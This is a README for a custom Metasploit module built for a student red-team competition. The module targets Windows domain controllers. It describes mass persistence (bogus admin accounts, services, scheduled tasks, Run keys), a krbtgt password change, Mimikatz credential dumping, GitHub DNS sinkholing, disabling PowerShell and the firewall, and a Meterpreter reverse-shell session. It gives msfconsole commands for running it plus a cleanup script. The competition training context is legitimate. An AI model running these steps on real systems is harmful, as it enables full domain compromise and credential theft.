# ADWomboComboV2 
Custom Metasploit Module
Thank you CDT Echo team for the **wonderful** name 😁😁😁

[![License: MSF](https://img.shields.io/badge/License-MSF-blue.svg)](https://github.com/rapid7/metasploit-framework)  
CDT Red Team Tool – Strictly for authorized CDT competition use in isolated environments only.

---

## Tool Overview

"ADWomboComboV2" is a substantial, original enhancement to the Metasploit Framework. It extends the existing `psexec` exploit family with aggressive, multi-layered persistence, credential harvesting, DNS sinkholing, PowerShell disruption, firewall manipulation, and Blue Team distraction capabilities specifically tailored for Windows Server 2022 x64 Domain Controllers.

### What it does
- Authenticates using provided Domain Admin credentials.
- Immediately deploys comprehensive persistence (bogus Domain Admin accounts with reversible encryption, multiple services, scheduled tasks, registry Run/RunOnce keys, right-click context menu hijack (still in-works), explorer hooks).
- Changes the `krbtgt` account password (prepares for golden/silver ticket attacks).
- Executes Mimikatz (if present) to dump credentials/hashes.
- Sinkholes all GitHub domains (`github.com`, `*.github.com`, `raw.githubusercontent.com`) to `0.0.0.0` and adds a minor DNS forward zone misconfiguration.
- Breaks PowerShell 5.1 by renaming the core executable.
- Adds 5 fake “SystemUpdateRule” firewall rules (random high ports) + fully disables the Windows Firewall.
- Delivers a final `windows/x64/meterpreter/reverse_tcp` session for immediate interactive access.

### Why it is useful for Red Team
It automates the “initial foothold → total persistence → Blue Team disruption” workflow in a single module, saving critical time during competitions and giving the Red Team a massive head start while forcing the Blue Team to spend time cleaning up multiple layered artifacts.

### Category
**Category 6: Enhancement to Open Source Tool** – A fully custom, non-trivial extension to Metasploit that adds capabilities far beyond the stock `psexec` module.

### High-level technical approach
- Uses Metasploit’s `SMB::Client::Authenticated` and `SMB::Client::Psexec` mixins for reliable execution.
- Uploads and runs an original, heavily commented PowerShell script via a temporary scheduled task.
- All persistence and disruption logic lives in the embedded PowerShell script (no external files required except optional Mimikatz).
- Final payload delivery uses the standard Meterpreter reverse TCP handler.

---

## Requirements & Dependencies

| Item                        | Requirement                                      |
|-----------------------------|--------------------------------------------------|
| Target OS                   | Windows Server 2022 x64 (Domain Controller)      |
| Metasploit Version          | 6.0+ (tested on Kali deployment)                 |
| Privileges                  | Domain Admin account (provided in competition)   |
| Network                     | SMB 445/tcp open and reachable                   |
| Optional                    | `mimikatz.exe` at `C:\Windows\Temp\mimikatz.exe` |
| Windows Defender            | Disabled (per competition environment)           |

No additional Ruby gems or external dependencies are required beyond a standard Metasploit installation.

---

## Installation Instructions

1. Clone or download this repository.
2. Copy the module into your Metasploit modules directory:
   ```bash
   cp custom_domain_persistence.rb ~/.msf4/modules/exploits/windows/smb/
   ```
3. Reload Metasploit:
   ```bash
   msfconsole -q -x "reload_all"
   ```
4. Verify the module is loaded:
   ```bash
   use exploit/windows/smb/custom_domain_persistence
   show info
   ```

Verification: The `show options` command should display `SMBUser`, `SMBPass`, `SMBDomain`, and `MIMIKATZ_PATH`.

---

## Usage Instructions

### Basic usage (recommended)
```bash
msfconsole -q
use exploit/windows/smb/custom_domain_persistence
set RHOST 192.168.50.10
set SMBUser Administrator
set SMBPass P@ssw0rd2026!
set SMBDomain .
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.50.100
set LPORT 4444
exploit
```

### Advanced usage examples

With custom Mimikatz path:
```bash
set MIMIKATZ_PATH C:\\Windows\\Temp\\mimikatz64.exe
```

Run only the persistence script (no final Meterpreter session):
- Comment out the final `super` call in the `exploit` method (advanced users only).

### Example output (abbreviated)
```
[*] Connecting to 192.168.50.10:445...
[+] Successfully authenticated with Domain Admin credentials
[+] Uploaded persistence/disruption script...
[+] Persistence script executed successfully!
[+] Delivering Meterpreter reverse_tcp payload...
[*] Meterpreter session 1 opened (192.168.50.100:4444 -> 192.168.50.10:49678)
[+] Module complete! Check for Meterpreter session.
```

Full example output and screenshots are in the `screenshots/` folder.

---

## Operational Notes

### Competition scenario usage
1. Obtain Domain Admin credentials (provided in the scenario).
2. Run the module against the target Domain Controller.
3. The machine is now heavily backdoored and GitHub is sinkholed → Blue Team hardening scripts are blocked.
4. Use the returned Meterpreter session for further lateral movement.

### OpSec considerations
- Creates many obvious artifacts (new users, services, tasks, registry keys, DNS records). This is intentional for competition disruption.
- Logs created: Security event log (new user creation, service start), System event log (scheduled tasks), DNS Server log.
- Mitigation: The module is loud by design; pair it with other stealth tools.

### Detection risks & mitigation
- Extremely noisy on purpose (Blue Team should detect it quickly). The goal is to force them to spend time cleaning up.
- Cleanup script can be generated on request.

### Cleanup / removal process
```Powershell
# Run as Domain Admin on the target
net user bogusDA1 /delete /domain
net user bogusDA2 /delete /domain
net user bogusDA3 /delete /domain
schtasks /delete /tn "RedTeamTask1" /f
schtasks /delete /tn "RedTeamTask2" /f
sc delete RedTeamSvc1
sc delete RedTeamSvc2
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v RedTeamPersist /f
# Restore PowerShell
Rename-Item "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe.disabled" -NewName powershell.exe
dnscmd . /recorddelete . github.com A 0.0.0.0
netsh advfirewall set allprofiles state on
```

---

## Limitations

- Requires Domain Admin credentials (as scoped by the competition).
- PowerShell breakage only affects Windows PowerShell 5.1 (PowerShell 7 is unaffected).
- Mimikatz dump only occurs if the binary is pre-uploaded.
- Not stealthy, designed for maximum disruption, not OPSEC.
- Tested only on Windows Server 2022, may require minor tweaks on other versions.

**Known issues**: None in current testing. The module has been verified to run end-to-end in an isolated OpenStack lab.

**Future improvements**: Add silent mode, encrypted C2 beacons, automatic golden ticket generation, and multi-target batch mode.

---

## Credits & References

- Author: Alexander Vyzhnyuk – Developed for CDT Delta Team
- Built on top of Rapid7’s Metasploit Framework (psexec mixins), no large blocks of code were copied, all persistence logic is original.
- Inspired by MITRE ATT&CK techniques: TA0003 (Persistence), TA0005 (Defense Evasion), T1556 (Modify Authentication P rocess), T1562 (Impair Defenses).
- Resources consulted: Metasploit documentation, PowerShell for Pentesters, Red Team Field Manual.

**Team Coordination Note**: This module fulfills Category 6. It pairs with teammates’ C2 beacons, credential scraper, or discruption tools.

---

## Repository Structure

```bash
ADWomboComboV2/
├── examples/                          # Usage examples and screenshots
│   └── screenshot-metasploit-session.png
├── README.md                          # This comprehensive documentation
└── custom_domain_persistence.rb       # The main Metasploit module (Ruby)
```